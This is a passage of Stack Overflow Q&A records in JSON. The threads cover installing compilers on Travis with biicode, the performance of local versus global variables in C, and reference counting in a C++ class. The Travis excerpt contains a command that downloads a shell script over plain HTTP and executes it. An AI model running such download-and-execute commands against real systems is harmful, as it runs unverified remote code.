"https://stackoverflow.com/questions/29808610/can-i-use-biicode-to-install-gcc-4-9-and-clang-3-5-on-travis/29810561#29810561", "title": "Can I use Biicode to install GCC 4.9 and Clang 3.5 on Travis?", "body": "<p>Nop. The command <code>bii setup:cpp</code> is very basic, just for C++ newbies and for a quick basic setup of mainstream gcc based compilers. You can see the source code: <a href=\"https://github.com/biicode/client/blob/develop/setups/installers/gnu_compiler_installer.py#L9\" rel=\"nofollow\">https://github.com/biicode/client/blob/develop/setups/installers/gnu_compiler_installer.py#L9</a></p>\n\n<ul>\n<li>In Win it will install MinGW 4.8</li>\n<li>In Ubuntu it will install the distribution build-essential, which for latest Ubuntu should be gcc 4.8.2</li>\n<li>In Mac it will install the standard XCode, with the mainstream CLang distribution.</li>\n</ul>\n\n<p>If you want to install in travis-ci those compilers, it can be sometimes quite tricky. I suggest using the scripts in <a href=\"https://github.com/biicode/misc\" rel=\"nofollow\">https://github.com/biicode/misc</a>. You can probably directly wget them and execute from your travis build.</p>\n"}], "owner": {"reputation": 1257, "user_id": 649140, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/ff4ce275d6b5e7986cc235e90c90a07b?s=128&d=identicon&r=PG", "display_name": "Sam Kellett", "link": "https://stackoverflow.com/users/649140/sam-kellett"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 319, "favorite_count": 0, "accepted_answer_id": 29810561, "answer_count": 1, "score": 1, "last_activity_date": 1429744050, "creation_date": 1429736059, "question_id": 29808610, "link": "https://stackoverflow.com/questions/29808610/can-i-use-biicode-to-install-gcc-4-9-and-clang-3-5-on-travis", "title": "Can I use Biicode to install GCC 4.9 and Clang 3.5 on Travis?", "body": "<p>Currently, the following except from my <code>.travis.yml</code> file:</p>\n\n<pre><code>before_install:\n  - wget http://apt.biicode.com/install.sh &amp;&amp; chmod +x install.sh &amp;&amp; ./install.sh\n  - bii setup:cpp\n</code></pre>\n\n<p>Produces the following output:</p>\n\n<pre><code>$ bii setup:cpp\nWARN: This setup is EXPERIMENTAL.\nPlease refer to the docs for manual installation if something fails\ncmake version 2.8.7\nInvalid cmake version 2.8.7 &lt; 3.0 in your path\nWARN: You are running in non-interactive mode.\nA CMake local copy will be installed automatically.\nPlease run with '-i' or '--interactive' for more options\nDownloading and installing CMake 3.0.2\nDownload  cmake-3.0.2-Linux-64.tar.gz\nfrom  https://s3.amazonaws.com/biibinaries/thirdparty/cmake-3.0.2-Linux-64.tar.gz\ndownload to  /tmp/tmpuO7mZ_/cmake-3.0.2-Linux-64.tar.gz\nPercent: [########################################] 100.0% of 10.1Mb Done...\nINFO: Extracting cmake\ncmake version 3.0.2\nCMake suite maintained and supported by Kitware (kitware.com/cmake).\nValid cmake version 3.0.2 &gt; 3.0 in \"/home/travis/.biicode/cmake-3.0.2-Linux-64/bin\"\nCMake 3.0.2 installed ok\ngcc 4.6.3 already installed\ng++ 4.6.3 already installed\n</code></pre>\n\n<p>I've check for options to the <code>bii setup:cpp</code> command but can't seem to find anything about this, am I missing something or do I have to install them externally to bii?</p>\n"}, {"tags": ["c++", "c", "algorithm", "optimization"], "comments": [{"owner": {"reputation": 15289, "user_id": 583833, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/791a00235c66b6c32effd4291101087f?s=128&d=identicon&r=PG", "display_name": "Borgleader", "link": "https://stackoverflow.com/users/583833/borgleader"}, "edited": false, "score": 4, "creation_date": 1429735751, "post_id": 29808488, "comment_id": 47745112, "body": "Seems to me like you could try both of these options yourself and benchmark the results, you&#39;d get a definitive answer."}, {"owner": {"reputation": 47569, "user_id": 3255455, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5993e7ece129141878cd6419d39cc26e?s=128&d=identicon&r=PG&f=1", "display_name": "gnasher729", "link": "https://stackoverflow.com/users/3255455/gnasher729"}, "edited": false, "score": 0, "creation_date": 1429735971, "post_id": 29808488, "comment_id": 47745267, "body": "What about posting some real code?"}, {"owner": {"reputation": 46142, "user_id": 773113, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/FKKLW.jpg?s=128&g=1", "display_name": "Mike Nakis", "link": "https://stackoverflow.com/users/773113/mike-nakis"}, "edited": false, "score": 3, "creation_date": 1429735996, "post_id": 29808488, "comment_id": 47745290, "body": "Whatever performance problems you are facing are most probably not in how you store your variables, nor on how you call your functions.  This would be the case if you threw a profiler on your code, and found that every single one of your, say, 1000 lines of code takes roughly one thousandth of the total run time.  But in all likelihood, that will not be the case.  So, use a profiler to pinpoint the bottleneck, and fix <b>that part only</b>."}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 1, "creation_date": 1429736002, "post_id": 29808488, "comment_id": 47745296, "body": "try to limit the lifetime of variable to &quot;just enough&quot;"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 2, "creation_date": 1429736123, "post_id": 29808488, "comment_id": 47745385, "body": "Suggestion: you are probably focusing on the wrong thing. How/where you declare variables can have performance impacts but is unlikely to be the dominate performance factor in the situation you have described. Unless you have specific reason to think it is."}, {"owner": {"reputation": 269328, "user_id": 5987, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/2a1f9f4986b58015691eb2014e78869f?s=128&d=identicon&r=PG", "display_name": "Mark Ransom", "link": "https://stackoverflow.com/users/5987/mark-ransom"}, "edited": false, "score": 0, "creation_date": 1429736988, "post_id": 29808488, "comment_id": 47745858, "body": "Have you actually run your code and discovered it&#39;s too slow, or are you simply <i>anticipating</i> a problem? Computers are <i>extremely</i> fast these days, millions of computations aren&#39;t usually a problem."}, {"owner": {"reputation": 153, "user_id": 3333877, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a40b0d8c1d2fd0a160df817911541273?s=128&d=identicon&r=PG", "display_name": "Fractal20", "link": "https://stackoverflow.com/users/3333877/fractal20"}, "reply_to_user": {"reputation": 269328, "user_id": 5987, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/2a1f9f4986b58015691eb2014e78869f?s=128&d=identicon&r=PG", "display_name": "Mark Ransom", "link": "https://stackoverflow.com/users/5987/mark-ransom"}, "edited": false, "score": 0, "creation_date": 1429737604, "post_id": 29808488, "comment_id": 47746222, "body": "@MarkRansom. I converted it from a MATLAB code. My simulations took ~30 days on my schools cluster. The C code is 6 times faster, still longer than I would like. I have to solve a bunch of fluid equations, so it is computationally expensive"}], "answers": [{"comments": [{"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1429774630, "post_id": 29808747, "comment_id": 47760463, "body": "Consider that optimization can even turn a local variable into global or the opposite (or even reserve a cpu register for it, leading to a non-memory-at-all variable)"}], "tags": [], "owner": {"reputation": 973, "user_id": 4777513, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/inkg3.jpg?s=128&g=1", "display_name": "Ekleog", "link": "https://stackoverflow.com/users/4777513/ekleog"}, "is_accepted": false, "score": 2, "last_activity_date": 1429736522, "creation_date": 1429736522, "answer_id": 29808747, "question_id": 29808488, "link": "https://stackoverflow.com/questions/29808488/efficiently-treating-functions-in-c-c-called-a-million-times/29808747#29808747", "title": "Efficiently treating functions in C/C++ called a million times", "body": "<p>Roughly, storing the variable as global or local should not change anything if you call your function inside a loop. Actually, the assembly code should most likely be the same (<code>sub esp, SomeValue</code>) ; the only difference being <code>SomeValue</code> that could change a bit ; which does not change anything to the delay ; to the clock cycle precision.</p>\n\n<p>Actually, setting the variable as global could even make your program run slower, as the compiler will be less able to understand your code and optimize it.</p>\n\n<p>So, if you call your function inside a loop, do not bother with global vs. local and just go the usual way: variables as local as possible.</p>\n\n<p>However, if your million calls are recursive calls, then memory is scarce and you should do your best to save it, and then should go for the global way.</p>\n\n<p>Anyway, you most likely have much better optimizations waiting to be made somewhere in your code !</p>\n"}, {"comments": [{"owner": {"reputation": 153, "user_id": 3333877, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a40b0d8c1d2fd0a160df817911541273?s=128&d=identicon&r=PG", "display_name": "Fractal20", "link": "https://stackoverflow.com/users/3333877/fractal20"}, "edited": false, "score": 0, "creation_date": 1429738187, "post_id": 29808804, "comment_id": 47746518, "body": "Thank you. I don&#39;t know enough about programming to understand the stack details, but I&#39;ll take your word for it and initialize them inside the functions"}, {"owner": {"reputation": 11458, "user_id": 3435400, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/61726fe80facc93d76754f0226b49eb9?s=128&d=identicon&r=PG&f=1", "display_name": "alain", "link": "https://stackoverflow.com/users/3435400/alain"}, "reply_to_user": {"reputation": 153, "user_id": 3333877, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a40b0d8c1d2fd0a160df817911541273?s=128&d=identicon&r=PG", "display_name": "Fractal20", "link": "https://stackoverflow.com/users/3333877/fractal20"}, "edited": false, "score": 0, "creation_date": 1429738604, "post_id": 29808804, "comment_id": 47746741, "body": "Thanks for believing me :-) , but keep in mind that optimisations always have to be tested when everything is finished, to know what difference (if any at all) they make."}, {"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1429771362, "post_id": 29808804, "comment_id": 47758455, "body": "Allocating a stack variable has no performaance cost, <b>but initializing it does</b>.  If he is going to initialize <i>several local variables</i>, but just once before calling the function (global vars in life, but local in scope) he has the option to <i>declare them as <code>static</code> inside the function body</i>.  He&#39;ll initialize them once and use many times, without the risk of being seen elsewhere.  Indeed, that&#39;s the reason to not initialize by default local variables."}, {"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1429771704, "post_id": 29808804, "comment_id": 47758672, "body": "The processor doesn&#39;t cache data based on spatial locality.  It uses a hash table, so the data can be spread.   It is <b>locality in time</b> what does data to remain in the cache.  If you access the same data soon after last use, it&#39;s most probable that it will be still present in the cache than not. Cache uses normally some LRU algorithm (least recently used) to replace the data in the cache."}, {"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1429772035, "post_id": 29808804, "comment_id": 47758874, "body": "By the way, spatial locality is important in instruction cache.  If the code of a loop is completely cached, you&#39;ll use the cache for all the execution of the loop.  This has to do with the secuential access done by the cpu to execute instructions.  But data is not subject to this same problem."}, {"owner": {"reputation": 11458, "user_id": 3435400, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/61726fe80facc93d76754f0226b49eb9?s=128&d=identicon&r=PG&f=1", "display_name": "alain", "link": "https://stackoverflow.com/users/3435400/alain"}, "reply_to_user": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1429785376, "post_id": 29808804, "comment_id": 47767983, "body": "@LuisColorado, thanks for trying to improve my answer, but this was too much. I tried to address some points you edited in myself."}, {"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1429851750, "post_id": 29808804, "comment_id": 47804415, "body": "Ok, well.  Do it yourself."}], "tags": [], "owner": {"reputation": 11458, "user_id": 3435400, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/61726fe80facc93d76754f0226b49eb9?s=128&d=identicon&r=PG&f=1", "display_name": "alain", "link": "https://stackoverflow.com/users/3435400/alain"}, "is_accepted": false, "score": 3, "last_activity_date": 1429785313, "last_edit_date": 1429785313, "creation_date": 1429736686, "answer_id": 29808804, "question_id": 29808488, "link": "https://stackoverflow.com/questions/29808488/efficiently-treating-functions-in-c-c-called-a-million-times/29808804#29808804", "title": "Efficiently treating functions in C/C++ called a million times", "body": "<blockquote>\n  <p>If I call a function a million times and every time it is called in\n  initializes a temporary variable, does this waste more time than if I\n  have a global temp value that it alters instead?</p>\n</blockquote>\n\n<p>No, it's even likely that the opposite is true. A temporary variable is created on the stack.   </p>\n\n<p><strong>Allocating a stack variable has no performance cost</strong><br>\nWhen the function is called, the stack pointer has to be moved anyway, to make room for the function arguments and other things. Now if an additional variable has to be allocated, all that has to be done is to increase the amount the stack pointer moves.<br>\nUnlike as with Java, you can leave a variable uninitialized, and store the final value directly when needed, such that there is no initialisation cost.</p>\n\n<p><a href=\"http://en.wikipedia.org/wiki/Locality_of_reference\" rel=\"nofollow\"><strong>Locality of reference</strong></a><br>\nis also better, when you use a stack variable. This means the values the function uses are closer to each other, and this helps the processor to cache the data more efficiently. The cache is organized in lines of typically 64 bytes, that means two 32bit values that are adjacent to each other are more efficient than two scattered ones.<br>\nSpatial locality is especially important when paging occurs, because loading a page from permanent storage has a <em>huge</em> performance cost. Therefore it is better to have all the variables needed at a certain time stored close together, such that they fit into one page.</p>\n"}, {"comments": [{"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1429774882, "post_id": 29808861, "comment_id": 47760648, "body": "What does <b>Type 1</b> variables mean?  What happened to <b>Type 2</b> ???  A <code>const double ABC</code> can be handled as a simple value if you never use a reference to it (in its scope).  This is exactly the performance you gain in case the compiler takes it into account."}], "tags": [], "owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "is_accepted": false, "score": 2, "last_activity_date": 1429736891, "creation_date": 1429736891, "answer_id": 29808861, "question_id": 29808488, "link": "https://stackoverflow.com/questions/29808488/efficiently-treating-functions-in-c-c-called-a-million-times/29808861#29808861", "title": "Efficiently treating functions in C/C++ called a million times", "body": "<p>Type 1 variables should be global</p>\n\n<p>const double ABC = 1.234567;</p>\n\n<p>The const is important for performance.</p>\n\n<p>Type 3 can't be global. They need to be passed in each function call</p>\n\n<pre><code>void f1(double x)\n{\n    x = x + ABC;\n    f2(x);\n}\n</code></pre>\n\n<p>In case you need f2 to change x and get a changed value back use a reference instead:</p>\n\n<pre><code>void f1(double&amp; x)\n{\n    x = x + ABC;\n    f2(x);\n}\n</code></pre>\n\n<p>Type 2 shall just be local in the functions:</p>\n\n<pre><code>void f1(double x)\n{\n    double y;\n    x = x + ABC;\n    f2(x);\n}\n</code></pre>\n\n<p>Be sure to check the compilers optimization flags to get best performance.</p>\n"}, {"tags": [], "owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "is_accepted": false, "score": 1, "last_activity_date": 1429852045, "last_edit_date": 1429852045, "creation_date": 1429776606, "answer_id": 29817387, "question_id": 29808488, "link": "https://stackoverflow.com/questions/29808488/efficiently-treating-functions-in-c-c-called-a-million-times/29817387#29817387", "title": "Efficiently treating functions in C/C++ called a million times", "body": "<p>You are talking about two differentiated concepts in C language:  extent and scope.</p>\n\n<ul>\n<li><p><strong>Extent</strong> has to do with the extent of time the variable is going to last.  Global variables have always <strong>global extent</strong>, it means that they last from program beginning to program end, retaining their values from assignment to assignment during the whole program life.  Local variables have normally <strong>local extent</strong>, that means that variable is created/allocated at the point of its definition, and its life extends to the end of the inner block containing it.  Normally, compilers advance the stack pointer register at each function/block entry call by a fixed amount depending on the local storage of the block and the sizes and the number of parameters (in case of function blocks), so adding a local variable only changes the constant value to be added to SP register resulting in no extra execution penalty.  This is also the reason for local variables not being initialized on entry.</p></li>\n<li><p><strong>Scope</strong> has to do with the visibility of the variable.  There are three different scopes for every object: <strong>Global scope</strong> means a variable can be accessed everywhere in the program;  <strong>File scope</strong> means a variable is only visible inside the file module that defines it, but not elsewhere, and; <strong>Local scope</strong> means a variable is visible from the point of declaration up to the end of the block. For global scope, you always have its name available to allow you to reference it.  In the opposite, local scope means a variable name is only available in the inner block containing its declaration (this is, the inner pair of <code>{</code> and <code>}</code> where the object is defined)</p></li>\n</ul>\n\n<p>When you use the word <code>static</code>, it means two things, depending on where you are using it:</p>\n\n<ul>\n<li>If you use it outside any blocks, <code>static</code> means <strong>file scope</strong> (as oppossed to <code>extern</code> that means global program scope) By default, variables (and data) are file scope and functions (and code) are global scope (with functions, you have to use <code>static</code> to make them visible only inside the file of declaration).  With file scope, the variables are only visible inside the file where it's declared, but it has also global extent.  All objects defined outside any block (at the file level) have global extent (they exist from program start to program end)</li>\n<li>If you use <code>static</code> inside a block, it means this variable has local scope but it has global extent.  If you use <code>extern</code> inside a block, it means the object is defined this way, but elsewhere (it has global extent and scope, and I want to use it locally)</li>\n</ul>\n\n<p>Just to complete, the appearance of <code>extern</code> doesn't make the compiler to allocate a variable, it only informs it that there's a variable (defined elsewhere, with global scope and extent) that has this type and name and can be accessed from here on, locally (or file scope, if used outside any block)  You'll have to put a declaration somewhere (in other file, or in this) without the word <code>extern</code> to make the compiler to allocate space for it.  For a program global variable, you have to define it twice (one with <code>extern</code> keyword and a definition without it ---and possibly an initializer) in the file where it actually resides, and be declared <code>extern</code> in all other files that are going to use it.</p>\n\n<h2>EDIT</h2>\n\n<p>For variables that do not change during the lifetime of the program, it's best to define them as <code>const</code>.  This way, you allow the compiler to remember the constant value and to use its value instead of making references to it all around the program.  There is a large benefit in making a global value a <code>const</code>.  <code>const</code>s aren't even allocated memory, if you never use them by reference (through the <code>&amp;</code> operator).</p>\n"}, {"comments": [{"owner": {"reputation": 153, "user_id": 3333877, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a40b0d8c1d2fd0a160df817911541273?s=128&d=identicon&r=PG", "display_name": "Fractal20", "link": "https://stackoverflow.com/users/3333877/fractal20"}, "edited": false, "score": 0, "creation_date": 1429798513, "post_id": 29823910, "comment_id": 47778483, "body": "Thank you. I will definitely look into this. Yes indeed, the majority of the time is taken with the actual computation of my fluid solver which has many calls to Sinh and logs. I&#39;ve spent a while carefully pre-calculating any expressions that show up more than once. With this specific part I&#39;m at the extent of my knowledge of how to even try to speed up that part. So now I&#39;m looking at the rest..."}, {"owner": {"reputation": 38606, "user_id": 23771, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/NeuGc.jpg?s=128&g=1", "display_name": "Mike Dunlavey", "link": "https://stackoverflow.com/users/23771/mike-dunlavey"}, "reply_to_user": {"reputation": 153, "user_id": 3333877, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a40b0d8c1d2fd0a160df817911541273?s=128&d=identicon&r=PG", "display_name": "Fractal20", "link": "https://stackoverflow.com/users/3333877/fractal20"}, "edited": false, "score": 0, "creation_date": 1429802172, "post_id": 29823910, "comment_id": 47781649, "body": "@Fractal20: I take my problem of interest and run it through a code-generator to make a problem-specific C program, which I then compile and link into my main program. That way no time is spent in superstructure. Then in place of calls to <code>exp</code> (for example) I have statics that remember the prior value of the argument and result to <code>exp</code>, and call a wrapper <code>exp_cached</code> which basically memoizes the function. This saved <i>big-time</i>, because lots of the calls were with arguments that change seldom or never. But again, first let the samples indicate it&#39;s necessary."}], "tags": [], "owner": {"reputation": 38606, "user_id": 23771, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/NeuGc.jpg?s=128&g=1", "display_name": "Mike Dunlavey", "link": "https://stackoverflow.com/users/23771/mike-dunlavey"}, "is_accepted": false, "score": 0, "last_activity_date": 1429793928, "last_edit_date": 1492088034, "creation_date": 1429793223, "answer_id": 29823910, "question_id": 29808488, "link": "https://stackoverflow.com/questions/29808488/efficiently-treating-functions-in-c-c-called-a-million-times/29823910#29823910", "title": "Efficiently treating functions in C/C++ called a million times", "body": "<p>First, don't go guessing what the problem is (that's what you're doing :)</p>\n\n<p>Second, let the running program tell you what takes time.\nIn your comment, you said it takes many hours.\nThe method I use is to run it under a debugger, interrupt it, and see what it's doing.\nIf you do this several times, you will see that the interrupts are strongly drawn to the problem.</p>\n\n<p>Do this with compiler optimization <em>off</em>. When you've made it as fast as you can, then turn on the compiler's optimizer.\nIf you've got silly stuff in there that you need to clean out, the optimizer won't clean it out for you. It will only make it harder to find.</p>\n\n<p><a href=\"https://scicomp.stackexchange.com/a/2719/1262\"><em>This post</em></a> shows some of my experience using this with scientific software.\nIt also gives the statistical justification why the method is so effective.</p>\n\n<p>Things I've found in the past are spending a large fraction of those hours a) calling functions like <code>exp</code> or <code>log</code> over and over with same or almost-same arguments, b) calling general-purpose functions like matrix-multiply or cholesky transform which might be replaced with specialized routines.</p>\n"}, {"tags": [], "owner": {"reputation": 15724, "user_id": 1716339, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/835fc3719b0118c68c4d202b3e5cbf18?s=128&d=identicon&r=PG", "display_name": "Aki Suihkonen", "link": "https://stackoverflow.com/users/1716339/aki-suihkonen"}, "is_accepted": false, "score": 0, "last_activity_date": 1429865919, "creation_date": 1429865919, "answer_id": 29842992, "question_id": 29808488, "link": "https://stackoverflow.com/questions/29808488/efficiently-treating-functions-in-c-c-called-a-million-times/29842992#29842992", "title": "Efficiently treating functions in C/C++ called a million times", "body": "<blockquote>\n  <p>If I call a function a million times and every time it is called in\n  initializes a temporary variable, does this waste more time than if I\n  have a global temp value that it alters instead?</p>\n</blockquote>\n\n<p>Not necessarily, because an optimizing compiler can put these variables directly into registers, instead of using even the stack. <strong>Also the global temp value can be stored in a register</strong>, as shown in below. In some architectures, such as x64, which has plenty of registers, one can hint the compiler to allocate both constants and other variables permanently to some registers.</p>\n\n<p>Sufficiently small data could be similarly placed on xmm0..xmm7.</p>\n\n<pre><code>register long int a __asm__(\"r14\");\n\nint foo(int b)\n{\n    a = b * 2 + a;\n    return a;\n}\n\nint bar(int c)\n{\n    a = a * 5 - c;\n    return a;\n}\n\nint init(int i) { a = i; }\n</code></pre>\n\n<hr>\n\n<pre><code>// in a separate file\nint main(){\n  init(3);\n  printf(\"%d %d\\n\", foo(1), bar(2));\n}\n</code></pre>\n\n<p>The disassembly shows, that the \"global\" variable is indeed stored into a register, allocated only once in <code>main</code></p>\n\n<pre><code>foo:  leal (%rdi,%rdi), %eax\n      cltq\n      addq %r14, %rax\n      movq %rax, %r14\n      ret\n\nbar:  leaq (%r14,%r14,2), %rax\n      movslq %edi, %rdi\n      subq %rdi, %rax\n      movq %rax, %r14\n      ret\n\nmain:  ...\n      movl $3, %r14d\n</code></pre>\n"}], "owner": {"reputation": 153, "user_id": 3333877, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a40b0d8c1d2fd0a160df817911541273?s=128&d=identicon&r=PG", "display_name": "Fractal20", "link": "https://stackoverflow.com/users/3333877/fractal20"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 319, "favorite_count": 0, "answer_count": 6, "score": 1, "last_activity_date": 1429865919, "creation_date": 1429735683, "last_edit_date": 1429736816, "question_id": 29808488, "link": "https://stackoverflow.com/questions/29808488/efficiently-treating-functions-in-c-c-called-a-million-times", "title": "Efficiently treating functions in C/C++ called a million times", "body": "<p>I'm new both to C and stackoverflow for programming questions. I've done a bit of googling about my question and I haven't been able to turn up information directly addressing this question. However, I also may just be so new to the subject that I'm not sure what terms are even appropriate to search for. So my apologies if this is a commonly asked question.</p>\n\n<p>My program is implementing a scientific computation. In particular, it mostly involves taking given coordinates and given forces and updating everything based on a series of computations. To get results, I run through everything about a million times, so I'm concerned about making it as efficient as possible. In particular I've found that I have 3 types of variables</p>\n\n<ol>\n<li>Variables that are constant and do not change</li>\n<li>Temporarily variables that change from iteration to iteration\nand just are used as place holders in calculations</li>\n<li>Data that is altered each iteration and then is carried through\nto the next</li>\n</ol>\n\n<p>What is the most efficient ways to declare these different variables? In my naivety I am tempted to declare everything as global variables, I'm pretty sure this could make sense for variables of type (1) and (3). However for type (2) I'm unsure. If I call a function a million times and every time it is called in initializes a temporary variable, does this waste more time than if I have a global temp value that it alters instead?</p>\n"}, {"tags": ["c++", "copy-on-write"], "comments": [{"owner": {"reputation": 31368, "user_id": 3133316, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/30f0b31e22bec21f12f31cd30ae5b148?s=128&d=identicon&r=PG&f=1", "display_name": "PaulMcKenzie", "link": "https://stackoverflow.com/users/3133316/paulmckenzie"}, "edited": false, "score": 2, "creation_date": 1429736834, "post_id": 29808449, "comment_id": 47745783, "body": "Your implementation falls to pieces with this simple code:  <code>int main() {     CPerson* a = new CPerson;    CPerson b(*a);    delete a;    cout &lt;&lt; b.m_name; }</code>  In other words, first created one is destroyed, but the second (<code>b</code>) is still alive and will now access memory that has been deallocated.  Time to look at your design, especially that reference counting variable (which is not really being shared by the instances)."}, {"owner": {"user_type": "does_not_exist", "display_name": "user743382"}, "edited": false, "score": 2, "creation_date": 1429738219, "post_id": 29808449, "comment_id": 47746542, "body": "Tip: don&#39;t re-invent the wheel (except perhaps to the extent required by your assignment). Keeping track of a reference count and freeing memory when the reference count reaches zero is something <code>shared_ptr</code> already does, and you can make use of it in your own class."}, {"owner": {"reputation": 8811, "user_id": 487892, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Leb5B.jpg?s=128&g=1", "display_name": "drescherjm", "link": "https://stackoverflow.com/users/487892/drescherjm"}, "edited": false, "score": 1, "creation_date": 1429738303, "post_id": 29808449, "comment_id": 47746578, "body": "<b><i>a.rename (&quot;John&quot;, &quot;Anderson&quot;); // should rename both &#39;a&#39; and &#39;b&#39;</i></b> I would expect rename to not change &#39;b&#39; if you are doing a copy on write."}, {"owner": {"reputation": 33, "user_id": 3135198, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5d1a5f74b2a9c063120840e1ae65a9b9?s=128&d=identicon&r=PG&f=1", "display_name": "user3135198", "link": "https://stackoverflow.com/users/3135198/user3135198"}, "edited": false, "score": 0, "creation_date": 1429739517, "post_id": 29808449, "comment_id": 47747158, "body": "drescherjm: yes, that is the next step, so far I was just going for a classic shallow copy (sorry, I should have been more clear about that) hvd: yes, I have been doing some research since asking this question and now I see that I should carry this information in a pointer in the middle. thanks for pointing that out PaulMcKenzie: thanks for that piece of code, will definitely help"}], "answers": [{"comments": [{"owner": {"reputation": 2921, "user_id": 9133378, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/goYCP.jpg?s=128&g=1", "display_name": "scottxiao", "link": "https://stackoverflow.com/users/9133378/scottxiao"}, "edited": false, "score": 0, "creation_date": 1519902402, "post_id": 29810013, "comment_id": 85100882, "body": "i think the reference count can be put into the <code>class CPerson</code> ,as long as we use <code>int* ref=new int</code> instead of <code>int ref</code>"}, {"owner": {"reputation": 2921, "user_id": 9133378, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/goYCP.jpg?s=128&g=1", "display_name": "scottxiao", "link": "https://stackoverflow.com/users/9133378/scottxiao"}, "edited": false, "score": 0, "creation_date": 1519902453, "post_id": 29810013, "comment_id": 85100909, "body": "and that&#39;s how the smart pointers does,because a smart pointer could not put a reference counting into user-defined class"}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "reply_to_user": {"reputation": 2921, "user_id": 9133378, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/goYCP.jpg?s=128&g=1", "display_name": "scottxiao", "link": "https://stackoverflow.com/users/9133378/scottxiao"}, "edited": false, "score": 0, "creation_date": 1519922552, "post_id": 29810013, "comment_id": 85113742, "body": "@bigxiao look at the actual implementation of <code>shared_ptr</code>. It wraps user-defined data inside a control block that also holds the reference count, and then passes a pointer to the control block around. Similar to how the code in my answer does."}, {"owner": {"reputation": 2921, "user_id": 9133378, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/goYCP.jpg?s=128&g=1", "display_name": "scottxiao", "link": "https://stackoverflow.com/users/9133378/scottxiao"}, "edited": false, "score": 0, "creation_date": 1519964940, "post_id": 29810013, "comment_id": 85130785, "body": "Where can i see the actual implementation of shared_ptr?Is there 